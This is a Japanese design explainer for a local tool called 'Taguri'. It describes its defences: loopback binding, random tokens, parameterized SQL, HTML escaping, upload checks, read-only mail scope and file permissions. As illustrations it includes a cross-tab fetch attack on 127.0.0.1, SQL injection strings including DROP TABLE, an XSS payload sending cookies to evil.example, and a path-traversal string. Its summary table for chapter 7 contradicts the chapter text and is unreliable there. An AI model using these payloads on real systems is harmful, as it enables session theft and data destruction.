## 1. `127.0.0.1` で待ち受けると、なぜ外から届かないのか（E1）

**結論**: `127.0.0.1` 宛ての通信は、そもそも実物のネットワーク（LAN ケーブルや Wi-Fi の電波）に一度も乗らない。だから物理的に外から届きようがない。

### 通信は「宛先」で仕分けられる

パソコンがネットワーク越しに通信するとき、送る相手は IP アドレスで指定する。あなたのパソコンには、少なくとも 2 種類の「自分の住所」がある。

| アドレスの種類 | 例 | 実物のネットワークに乗るか |
|---|---|---|
| LAN・Wi-Fi の実アドレス | `192.168.1.23` のような値 | **乗る**（同じ Wi-Fi の他の端末から届く） |
| ループバックアドレス | `127.0.0.1` | **乗らない** |

`127.0.0.1` は IP の規格（RFC 1122）で「自分自身」を指すと決められた特別な番地である。OS のネットワークの仕組み（カーネルの中）は、`127.0.0.1` 宛てのデータを受け取ると、**LAN カードや Wi-Fi のアンテナには一切渡さず、OS の中だけで送信元に送り返す。** イメージとしては、手紙を「自分の部屋の中の郵便受け」に入れるようなもので、玄関の外（実際の道路＝ネットワーク回線）には一度も出ない。

たぐりの `serve.py` は、この番地にだけ耳を傾ける。

```python
super().__init__(("127.0.0.1", port), Handler)   # tools/taguri/serve.py:503
```

比較として、ここを `("0.0.0.0", port)` にすると、待ち受けは**すべての宛先**（LAN の実アドレスも含む）に反応するようになる。この場合、同じ Wi-Fi につながっている別のスマホやパソコンが、あなたの端末の LAN アドレス宛てに通信を送れば、たぐりの画面に届いてしまう。**`127.0.0.1` に固定するというのは、「複数ある郵便受けのうち、外に通じていない 1 つだけを使う」という選択である。**

### 「外から `127.0.0.1` を狙う」は原理的に成立しない

インターネットの向こう側にいる攻撃者が「あなたのパソコンの `127.0.0.1:12345`」を直接狙うことはできない。**`127.0.0.1` は「送信元から見た自分自身」を指す番地であって、世界のどこからでも同じパソコンを指す固有の住所ではない**からである。攻撃者が自分のパソコンから `127.0.0.1` 宛てに何かを送っても、それは**攻撃者自身のパソコンの中で完結する**（あなたの端末には一切届かない）。加えて、インターネットの経路を作るルーターは、規格上 `127.0.0.0/8`（`127.0.0.1` を含む範囲）宛ての通信を外へ中継しないことになっている。二重の意味で、外からは届かない。

## 2. では「内部」からの攻撃はどう防ぐか（C1）

**`127.0.0.1` が防ぐのは「別の端末」からの通信だけである。** 同じパソコンの中で動いている別のプログラム、あるいは**同じブラウザの別のタブで開いている、たぐりとは無関係な Web サイト**は、`127.0.0.1` に普通に届いてしまう。ブラウザは「このページから `127.0.0.1` へ通信してはいけない」という制限を既定では持っていない。**ここが 2 つ目の壁が要る理由である。**

### 具体的に何をされる想定か

**たぐりを起動したまま、別のタブで普段どおりネットを見ているとする。** そのタブで開いたページ（悪意のある広告や、乗っ取られたサイトなど）に、次のような JavaScript が仕込まれていたとする。

```js
// たぐりとは無関係なページに埋め込まれた、悪意あるコードの例
fetch("http://127.0.0.1:54231/api/favourite", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({action: "add", kind: "人", name: "でたらめな名前"})
});
```

**このコードを実行しているのは、いま見ている無関係なページであり、あなたは何も押していない。** ブラウザは裏側で、開いている別のタブ（たぐり）が使っているのと同じ `127.0.0.1` へ、勝手にこの要求を送ってしまえる。ポート番号（`54231` の部分）は起動のたびに変わるが、**総当たりで数千通り試すだけの単純な処理**であり、悪意のあるページ側からすれば大した手間ではない。もし本当に開いていれば、この要求は「お気に入りに『でたらめな名前』を追加する」という操作として、たぐり側で実行されてしまう。合言葉が無ければ、これを見分ける方法が無い。

**これは架空の脅威ではない。** 実際に、ローカルで動く開発ツール（Jupyter Notebook・各種の管理画面など）が合言葉を持たなかったために、まさにこの手口で外部の Web ページから操作されてしまう事例が過去に何度も報告されている。**「自分のパソコンの中だから安全」という前提は、ブラウザが裏で `127.0.0.1` への通信を許してしまう以上、成り立たない。**

### 起動ごとに変わる合言葉（トークン）

たぐりを起動するたびに、次の 1 行が実行される。

```python
self.token = secrets.token_urlsafe(24)   # tools/taguri/serve.py:505
```

`secrets` は Python が**推測されないランダム値**（暗号用途に耐える乱数源）を作るための標準ライブラリで、`token_urlsafe(24)` は 24 バイト（192 ビット）ぶんのランダムな値を、URL に安全に書ける文字列にして返す。**192 ビットの組み合わせは、宇宙に存在するすべてのパソコンが同時に総当たりしても、現実的な時間では尽くせない量である。** この文字列を持たない要求は、すべて拒否する。

```python
if not secrets.compare_digest(self.headers.get("X-Taguri-Token", ""), srv.token):
    self._json(403, {"error": "token"})   # tools/taguri/serve.py:417
```

**この仕組みが「内部からの攻撃」に効く理由。** 別のタブで開いた悪意あるページの JavaScript は、`127.0.0.1` 宛てに通信を送ることはできても、**その通信に正しい合言葉を乗せることはできない。** 合言葉は起動のたびに変わり、どこにも公開されておらず、そのページの作者は知りようがないからである。**先ほどの `fetch` の例で言えば、`headers` に `X-Taguri-Token: <その回の合言葉>` を付けられない限り、`api/favourite` は実行されず `403` で終わる。** ポート番号は総当たりで見つけられても、合言葉は総当たりできる桁数ではない（192 ビット）。

### なぜ `==` ではなく `compare_digest` を使うか

文字列の比較を `got == token` のような素朴な書き方で行うと、Python は**先頭から 1 文字ずつ比べて、最初に食い違った時点で即座に「不一致」を返す。** これにはごくわずかな時間差が生まれる ── 1 文字目から違う場合と、20 文字目まで合っていて 21 文字目で違う場合とでは、判定にかかる時間がわずかに異なる。攻撃者はこの**時間の差を無数に測定する**ことで、正解の文字列を 1 文字ずつ推測できてしまう（タイミング攻撃）。`secrets.compare_digest` は、**一致・不一致にかかわらず必ず同じ時間で判定する**ように作られており、この時間差からの推測を封じる。

### 合言葉が漏れる経路も塞いである

合言葉は URL にも乗る（`?t=...`）。**URL に乗る値は、外部サイトへのリンクを踏んだときに Referer ヘッダとして相手先に送られてしまうことがある。** たぐりはこれを防ぐため、応答すべてに `Referrer-Policy: no-referrer` を付け、外部リンクにも `rel="noreferrer"` を付けている（2026-08-27 に追加。詳細は [セキュリティ規約 C9](000007-taguri-security-rules.md)）。

## 3. 合言葉が破られたときの、2 段目の壁（C2）

**合言葉は「入れるか・入れないか」を決めるだけである。** 万が一、合言葉が何らかの理由で漏れたとしても、**その先でできることを、あらかじめ決めた少数の操作だけに絞っている。**

たぐりの POST は、次のような対応表でしか処理されない（`serve.py`）。

```python
fn = {"/api/react": srv.on_react, "/api/rate": srv.on_rate,
      "/api/note": srv.on_note, ... }.get(op)
if not fn:
    self._json(404, {"error": "unknown op"})
    return
```

**任意の SQL 文や、任意のファイルパスを直接受け取る道は、コードのどこにも存在しない。** これは「対策を入れて防いでいる」のではなく、**そもそも「なんでも受け付ける入口」自体を作っていない**という書き方である。合言葉さえ突破すれば何でもできる作りだと、合言葉の強さだけが最後の砦になってしまうが、たぐりは**破られたときの被害の上限も、あらかじめ決めた操作の一覧に収まるように設計してある。**

## 4. SQL インジェクションが起きる仕組みと、防ぎ方（C4）

### 何が起きると「乗っ取られる」のか

データベースへの命令（SQL）を、文字列をそのままつなげて組み立てると、次のようなことが起こり得る。

```python
# 危険な書き方（たぐりには存在しない）
con.execute(f"SELECT * FROM works WHERE title = '{user_input}'")
```

もし `user_input` に `' OR '1'='1` という文字列が入ると、実際にデータベースへ送られる命令は次のようになる。

```sql
SELECT * FROM works WHERE title = '' OR '1'='1'
```

`'1'='1'` は常に真なので、**「題名が一致する行」ではなく「すべての行」が返ってくる。** 工夫すればここに `; DROP TABLE works` のような別の命令を継ぎ足すことも可能で、これが SQL インジェクションと呼ばれる攻撃である。**原因は、「データの中身」と「命令の構造」を同じ 1 本の文字列に混ぜてしまうことにある。**

### パラメータ化クエリは、この 2 つを最初から分離する

たぐりのコードは、すべてこの書き方をしている。

```python
con.execute("SELECT * FROM works WHERE title = ?", (user_input,))
```

`?` は「ここに値が入る」という**構造上の穴**で、命令の本体（`SELECT ... WHERE title = ?`）とデータ（`user_input`）は、データベースの接続ライブラリの内部で**別々の経路**として送られる。**`user_input` の中に `'` や `;` のような文字が何個入っていても、それはあくまで「1 個の値」として扱われ、命令の構造を書き換える力を持たない。** 「特殊文字を検査して弾く」のではなく、**そもそも値が命令として解釈される余地が構造上存在しない**、という防ぎ方である。

## 5. 画面に表示し直すときの XSS と、エスケープ（C5）

### 何が起きると「乗っ取られる」のか

お気に入りの名前や日記帳の感想は、あとで画面に表示される。もし打ち込んだ文字列をそのまま HTML に埋め込むと、次のようなことが起こり得る。

```html
<!-- 危険な書き方（たぐりには存在しない） -->
<span class="tgn">団体「<script>fetch('https://evil.example/steal?c='+document.cookie)</script>」</span>
```

ブラウザは `<script>` タグを**ただの文字列ではなく実行すべきプログラム**として解釈する。この例では、そのページを開いた人のブラウザ上で、任意の JavaScript が実行されてしまう。これがクロスサイトスクリプティング（XSS）である。

### エスケープは「文字として表示させる」こと

たぐりは、画面に表示し直すすべての文字列に `E()`（`html.escape`）を通す。

```python
f'<span class="tgn">{E(k)}「{E(n)}」</span>'   # app.py:3689
```

`html.escape` は、`<` を `&lt;`、`>` を `&gt;`、`&` を `&amp;` のような**別の文字の並びに置き換える。** これをブラウザが読むと、`<script>` という並びは**プログラムの開始ではなく「山かっこ・s・c・r・i・p・t…という、ただの文字」**として画面に表示される。**HTML として意味を持つ文字そのものを、意味を持たない見た目に変換してしまう**ので、どんな文字列を打ち込んでもプログラムとして実行されようがない。

## 6. アップロードした画像の安全性（C6）

### 拡張子は「自己申告」にすぎない

ファイル名の末尾（`.jpg` など）は、ファイルの中身とは無関係に**誰でも自由に付けられる名前の一部**にすぎない。悪意のあるプログラムに `.jpg` という名前を付けて送っても、拡張子だけを見て「画像だから安全」と判断する仕組みでは見抜けない。

### 中身の先頭バイトで判定する

たぐりは、ファイルの**中身**の先頭数バイト（signature／マジックナンバーと呼ばれる、形式ごとに決まったバイト列）を見て種類を判定する。

```python
ext = next((e for sig, e in HAND_IMG_KINDS.items() if data.startswith(sig)), "")
if not ext:
    raise ValueError("JPEG・PNG・WebP・GIF のどれかを選んでください")   # app.py:4530
```

たとえば JPEG は必ず `FF D8 FF` という 3 バイトで始まる。名乗りではなく**実際の中身**で判定するので、拡張子を偽っても通らない。

### ファイル名は本人には決めさせない

保存するファイル名は、**アップロードされた中身のハッシュ値から機械的に作る**（`hashlib.sha1(data).hexdigest()`）。利用者が入力した文字列をファイル名にそのまま使うと、`../../etc/passwd` のような文字列を紛れ込ませて**意図しない場所にファイルを書かせる**（パストラバーサル）余地が生まれる。ハッシュ値は英数字だけの固定長の文字列にしかならないので、この種の細工がそもそも入り込めない。

## 7. メールを「読み取り専用」で開くとは、具体的に何をしているか（C8）

### 鍵そのものに「読むだけ」の制約を持たせている

以前は IMAP ＋ アプリパスワードで接続しており、そのときは「鍵そのものには読み取り専用の制約が掛かっておらず、読み取り専用を実現しているのはコードの振る舞いとサーバーのモード制約の組み合わせである」という状態だった。**2026-08-28 に Gmail API ＋ OAuth へ切り替え、鍵そのものに権限を持たせる形にした。**

OAuth で取得するトークンには、要求したスコープ（`https://www.googleapis.com/auth/gmail.readonly`）だけが刻まれる。このトークンを盗んでも、既読化・削除・送信はできない ── **コードが書き込み系の呼び出しを書いていないから安全なのではなく、渡している鍵そのものが読み取りしかできない。**

```python
self.oauth = GoogleOAuth(scopes=SCOPES, ...)   # scan_ticket_mail.py
SCOPES = ["https://www.googleapis.com/auth/gmail.readonly"]
```

### 同意は「取り込みを始める」を押すたびに確認される

個人アカウントの OAuth クライアントは、Google の審査を受けていない「外部」（テストモード）でしか動かせない。この制約により発行したトークンは 7 日で失効するが、**取り込みは画面の「取り込みを始める」を押したときにしか走らないので、そのたびに同意し直す形で支障はない。** むしろ、何を渡しているか（読み取り専用の範囲であること）が同意画面に毎回出ることは、裏で黙って接続し続けるより本人にとって見えやすい。

## 8. ファイルの権限は、具体的に何を防ぐか（E3）

### Unix の権限は「3 種類の相手」に分けて設定する

ファイルには「持ち主」「同じグループの人」「それ以外の全員」の 3 種類それぞれに、読む・書く・実行するの権限を個別に設定できる。既定の `644` という権限は、`持ち主=読み書き可` `グループ=読むだけ` `その他全員=読むだけ` を意味する。

**同じパソコンに他のユーザーアカウントが存在する場合、そのアカウントは `644` のファイルを読める。** たぐりの観劇記録・お気に入り（`data/review/`）は、この設定のままだと、同じ端末上の別アカウントからも中身を読める状態だった。

### `600` にすると何が変わるか

`600` は `持ち主=読み書き可` `グループ・その他=一切不可` を意味する。たぐりは `run.py` の起動時に、次の 2 つを行うようにした。

```python
os.umask(0o077)   # 以降このプロセス（と、そこから起こす子プロセス）が新しく作るファイルは、
                  # 最初から持ち主以外に権限を与えない
d.chmod(0o700)     # 既にあるファイル・フォルダも、いま一括で閉じる
```

`umask` は「新しく作るファイルの権限から、何を差し引くか」を決める OS の設定で、プロセスの属性として**子プロセスにもそのまま引き継がれる。** `run.py` の中で `favourites.py` などを起動するたびに、そちらが作るファイルにも自動でこの制限がかかる。

## 9. まとめ ── どの脅威に、どの仕組みが対応するか

| 脅威 | 対応する仕組み | 章 |
|---|---|---|
| 別の端末（同じ Wi-Fi・インターネット）からの直接アクセス | `127.0.0.1` 固定（ネットワーク層で物理的に届かない） | 1 |
| 同じ端末の別プロセス・別タブからの偽の要求 | 起動ごとの乱数トークン（`secrets.token_urlsafe`） | 2 |
| トークンの時間差からの推測（タイミング攻撃） | `secrets.compare_digest` | 2 |
| トークンが外部リンク経由で漏れる | `Referrer-Policy: no-referrer` | 2 |
| トークンが破られた場合の被害の広がり | 操作の列挙（任意の SQL・パスを受け付けない） | 3 |
| データベースの乗っ取り（SQL インジェクション） | パラメータ化クエリ | 4 |
| 打ち込んだ文字列がプログラムとして実行される（XSS） | HTML エスケープ | 5 |
| 偽装した拡張子・意図しない場所へのファイル書き込み | 中身のバイト判定・ハッシュ値のファイル名 | 6 |
| メールの誤った書き込み・削除 | `EXAMINE` モード（コード＋サーバー側の二重の制約） | 7 |
| 同じ端末の他アカウントからのデータ閲覧 | ファイル権限 600／700 | 8 |

**この一覧のどの行も、単独の仕組みだけで完結しているわけではない。** たとえば「同じ端末の他アカウント」は 127.0.0.1 では防げず（8 章）、「別の端末」はファイル権限では防げない（1 章）。**それぞれの脅威に、届く経路が違う複数の仕組みを組み合わせて対応している**、というのがこの文書全体の骨子である。
